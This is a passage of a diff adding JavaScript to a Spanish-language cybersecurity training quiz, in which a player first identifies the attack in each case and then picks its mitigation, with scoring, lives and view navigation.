+            document.getElementById('caseScenarioText').textContent = currentCase.scenario;
+            document.getElementById('caseLogText').textContent = currentCase.log;
+            document.getElementById('caseFeedbackBox').classList.remove('show');
+
+            const phaseBadge = document.getElementById('casePhaseBadge');
+            const promptEl = document.getElementById('casePromptText');
+
+            let mixedOptions = [];
+            if (casePhase === 1) {
+                phaseBadge.className = 'step-indicator step-phase-1';
+                phaseBadge.textContent = 'FASE 1 DE 2: IDENTIFICAR EL ATAQUE';
+                promptEl.textContent = '1️⃣ Analiza la evidencia: ¿Qué ciberataque exacto está ocurriendo?';
+                mixedOptions = buildMixedCaseOptions(currentCase, 'attackName');
+            } else {
+                phaseBadge.className = 'step-indicator step-phase-2';
+                phaseBadge.textContent = 'FASE 2 DE 2: APLICAR LA SOLUCIÓN';
+                promptEl.textContent = `2️⃣ Ataque identificado (${currentCase.attackName}). ¿Cuál es la solución arquitectónica correcta?`;
+                mixedOptions = buildMixedCaseOptions(currentCase, 'solutionText');
+            }
+
+            const letters = ['A', 'B', 'C', 'D'];
+            const listEl = document.getElementById('caseOptionsList');
+            listEl.innerHTML = mixedOptions.map((opt, idx) => `
+                <button class="option-btn" onclick="handleCaseAnswer(this, ${opt.isCorrect})">
+                    <span class="option-letter">${letters[idx]}</span>
+                    <span>${opt.text}</span>
+                </button>
+            `).join('');
+
+            updateCaseHud();
+        }
+
+        /**
+         * Evalúa la respuesta del usuario tanto en la Fase 1 (Ataque) como en la Fase 2 (Solución).
+         */
+        function handleCaseAnswer(btnEl, isCorrect) {
+            if (caseLocked) return;
+            caseLocked = true;
+
+            const currentCase = casesDeck[caseIndex];
+            const allBtns = document.querySelectorAll('#caseOptionsList .option-btn');
+            allBtns.forEach(b => b.disabled = true);
+
+            const fbBox = document.getElementById('caseFeedbackBox');
+            const fbTitle = document.getElementById('caseFeedbackTitle');
+            const fbText = document.getElementById('caseFeedbackText');
+            const nextBtn = document.getElementById('caseNextBtn');
+
+            if (isCorrect) {
+                btnEl.classList.add('correct');
+                playTone('hit');
+                caseScore += (casePhase === 1) ? 150 : 200;
+                fbTitle.textContent = (casePhase === 1)
+                    ? '✅ ¡Ataque identificado correctamente! (+150 pts)'
+                    : '🛡️ ¡Solución aplicada! Incidente contenido (+200 pts)';
+                fbTitle.style.color = 'var(--accent-green)';
+            } else {
+                btnEl.classList.add('wrong');
+                allBtns.forEach(b => {
+                    if (b.getAttribute('onclick').includes('true')) {
+                        b.classList.add('correct');
+                    }
+                });
+                playTone('miss');
+                caseLives--;
+                fbTitle.textContent = `❌ Fallo crítico en el incidente (Te quedan ${caseLives} vidas)`;
+                fbTitle.style.color = 'var(--accent-red)';
+            }
+
+            updateCaseHud();
+
+            if (casePhase === 1) {
+                fbText.textContent = currentCase.explanation;
+                nextBtn.textContent = (caseLives > 0) ? 'Ir a Fase 2: Elegir Solución 🛡️ ➔' : 'Ver Resultado Final ➔';
+            } else {
+                fbText.textContent = `Mitigación clave: ${currentCase.solutionText}`;
+                nextBtn.textContent = (caseLives > 0) ? 'Siguiente Caso de Ataque ➔' : 'Ver Resultado Final ➔';
+            }
+
+            fbBox.classList.add('show');
+        }
+
+        /**
+         * Pasa de la Fase 1 a la Fase 2 del mismo caso, o salta al siguiente caso aleatorio.
+         * Si el jugador ha perdido las 3 vidas, muestra Game Over y obliga a empezar de nuevo.
+         */
+        function advanceCaseStep() {
+            if (caseLives <= 0) {
+                showCaseEndScreen(false);
+                return;
+            }
+
+            if (casePhase === 1) {
+                casePhase = 2;
+                renderCurrentCaseStep();
+            } else {
+                casePhase = 1;
+                caseIndex++;
+                if (caseIndex >= casesDeck.length) {
+                    showCaseEndScreen(true);
+                    return;
+                }
+                renderCurrentCaseStep();
+            }
+        }
+
+        function showCaseEndScreen(victory) {
+            document.getElementById('casePlayArea').style.display = 'none';
+            const panel = document.getElementById('caseEndPanel');
+            panel.classList.add('show');
+
+            if (victory) {
+                document.getElementById('caseEndIcon').textContent = '🛡️';
+                document.getElementById('caseEndTitle').textContent = '¡Arquitectura 100% Defendida!';
+                document.getElementById('caseEndDesc').textContent =
+                    `Has resuelto los ${casesDeck.length} casos identificando tanto el ataque como la solución con ${caseScore} puntos.`;
+            } else {
+                document.getElementById('caseEndIcon').textContent = '💀';
+                document.getElementById('caseEndTitle').textContent = '¡Has perdido las 3 vidas!';
+                document.getElementById('caseEndDesc').textContent =
+                    `Caíste en el Caso ${caseIndex + 1} de ${casesDeck.length} con una puntuación de ${caseScore} pts. Pulsa para volver a empezar con los casos mezclados.`;
+            }
+        }
+
+        /* =====================================================================
+           6. NAVEGACIÓN ENTRE LAS 3 PARTES DE LA APLICACIÓN
+           ===================================================================== */
+        function switchView(viewName) {
+            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+
+            document.getElementById('view-' + viewName).classList.add('active');
+            document.getElementById('tab-' + viewName).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Inicialización automática al cargar la página en el iPhone
+        window.addEventListener('DOMContentLoaded', () => {
+            loadSavedFontSize();
+            filterMap('ALL');
+            initQuizGame();
+            initCasesGame();
+        });
+    </script>
+</body>
+</html>
